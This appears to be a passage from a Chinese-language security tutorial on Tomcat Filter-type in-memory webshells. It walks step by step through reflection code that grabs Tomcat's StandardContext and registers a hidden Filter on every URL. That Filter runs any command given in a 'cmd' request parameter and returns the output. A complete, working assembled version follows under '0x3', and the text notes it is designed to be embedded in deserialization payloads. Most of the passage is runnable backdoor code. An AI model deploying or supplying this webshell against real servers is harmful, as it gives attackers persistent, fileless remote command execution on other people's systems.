    Filter filter = new Filter() {
        @Override
        public void init(FilterConfig filterConfig) throws ServletException {
        }
        @Override
        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
            HttpServletRequest req = (HttpServletRequest) servletRequest;
            if (req.getParameter("cmd") != null){
                InputStream in = Runtime.getRuntime().exec(req.getParameter("cmd")).getInputStream();
                Scanner s = new Scanner(in).useDelimiter("\\A");
                String output = s.hasNext() ? s.next() : "";
                servletResponse.getWriter().write(output);
                return;
            }
            filterChain.doFilter(servletRequest,servletResponse);
        }
        @Override
        public void destroy() {
        }
    };
在doFilter方法中实现命令执行回显功能。
**3\. 创建filterDef封装Filter对象**
为了之后将内存马融合进反序列化payload中，这里特意使用反射获取FilterDef对象。如果使用的是jsp或者是非反序列化的利用，那么可以直接使用new创建对象。
    Class FilterDef = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
    Constructor declaredConstructors = FilterDef.getDeclaredConstructor();
    FilterDef o = (org.apache.tomcat.util.descriptor.web.FilterDef)declaredConstructors.newInstance();
    o.setFilter(filter);
    o.setFilterName(FilterName);
    o.setFilterClass(filter.getClass().getName());
    standardContext.addFilterDef(o);
setFilter方法将自己创建的Filter绑定在FilterDef中，setFilterName设置的是Filter的名称，最后把FilterDef添加在standardContext的FilterDefs变量中。
**4\. 创建filterMap绑定URL**
通过反射创建FilterMap实例，该部分代码主要是注册filter的生效路由，并将FilterMap对象添加在standardContext中FilterMaps变量的第一个。
    Class FilterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
    Constructor declaredConstructor = FilterMap.getDeclaredConstructor();
    org.apache.tomcat.util.descriptor.web.FilterMap o1 = (org.apache.tomcat.util.descriptor.web.FilterMap)declaredConstructor.newInstance();
    o1.addURLPattern("/*");
    o1.setFilterName(FilterName);
    o1.setDispatcher(DispatcherType.REQUEST.name());//只支持 Tomcat 7.x 以上
    standardContext.addFilterMapBefore(o1);
**5\. 获取filterConfigs变量，并向其中添加filterConfig对象**
首先获取在standardContext中存储的filterConfigs变量。
    Configs = StandardContext.class.getDeclaredField("filterConfigs");
    Configs.setAccessible(true);
    filterConfigs = (Map) Configs.get(standardContext);
之后通过反射生成ApplicationFilterConfig对象，并将其放入filterConfigs hashMap中。
    Class ApplicationFilterConfig = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");
    Constructor declaredConstructor1 = ApplicationFilterConfig.getDeclaredConstructor(Context.class,FilterDef.class);
    declaredConstructor1.setAccessible(true);
    ApplicationFilterConfig filterConfig = (org.apache.catalina.core.ApplicationFilterConfig) declaredConstructor1.newInstance(standardContext,o);
    filterConfigs.put(FilterName,filterConfig);
###  0x3 完整代码
完整代码主要参照了nice_0e3师傅的文章，在最后结果输出的时候要注意如果有两次response结果需要将第一次的Writer flush
掉，避免在后台报错。
    Field Configs = null;
    Map filterConfigs;
    try {
        //Step 1
        ServletContext servletContext = request.getSession().getServletContext();
        Field appctx = servletContext.getClass().getDeclaredField("context");
        appctx.setAccessible(true);
        ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
        Field stdctx = applicationContext.getClass().getDeclaredField("context");
        stdctx.setAccessible(true);
        StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
        String FilterName = "cmd_Filter";
        Configs = StandardContext.class.getDeclaredField("filterConfigs");
        Configs.setAccessible(true);
        filterConfigs = (Map) Configs.get(standardContext);
        //Step 2
        if (filterConfigs.get(FilterName) == null){
            Filter filter = new Filter() {
                @Override
                public void init(FilterConfig filterConfig) throws ServletException {
                }
                @Override
                public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
                    HttpServletRequest req = (HttpServletRequest) servletRequest;
                    if (req.getParameter("cmd") != null){
                        InputStream in = Runtime.getRuntime().exec(req.getParameter("cmd")).getInputStream();
                        //
                        Scanner s = new Scanner(in).useDelimiter("\\A");
                        String output = s.hasNext() ? s.next() : "";
                        servletResponse.getWriter().write(output);
                        return;
                    }
                    filterChain.doFilter(servletRequest,servletResponse);
                }
                @Override
                public void destroy() {
                }
            };
            //Step 3
            Class FilterDef = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
            Constructor declaredConstructors = FilterDef.getDeclaredConstructor();
            FilterDef o = (org.apache.tomcat.util.descriptor.web.FilterDef)declaredConstructors.newInstance();
            o.setFilter(filter);
            o.setFilterName(FilterName);
            o.setFilterClass(filter.getClass().getName());
            standardContext.addFilterDef(o);
            //Step 4
            Class FilterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
            Constructor declaredConstructor = FilterMap.getDeclaredConstructor();
            org.apache.tomcat.util.descriptor.web.FilterMap o1 = (org.apache.tomcat.util.descriptor.web.FilterMap)declaredConstructor.newInstance();
            o1.addURLPattern("/*");
            o1.setFilterName(FilterName);
            o1.setDispatcher(DispatcherType.REQUEST.name());
            standardContext.addFilterMapBefore(o1);
            //Step 5
            Class ApplicationFilterConfig = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");
            Constructor declaredConstructor1 = ApplicationFilterConfig.getDeclaredConstructor(Context.class,FilterDef.class);
            declaredConstructor1.setAccessible(true);
            ApplicationFilterConfig filterConfig = (org.apache.catalina.core.ApplicationFilterConfig) declaredConstructor1.newInstance(standardContext,o);
            filterConfigs.put(FilterName,filterConfig);
        }
    } catch (Exception e) {
        e.printStackTrace();
    }
## 0x05 总结
本文主要学习了Tomcat架构组成及各模块组件之间的关联关系，重点分析Connector、Container和Context在整个数据请求处理过程中发挥的作用。通过梳理Tomcat在启动过程中FilterChain的注册流程，分析清楚如何动态注册加载自己设计的Filter对象。之后的文章将继续分析Tomcat内存马Listener、Servlet等实现技术以及各种查杀技术，最后感谢各位师傅关于内存马知识的总结分享。
## 参考文章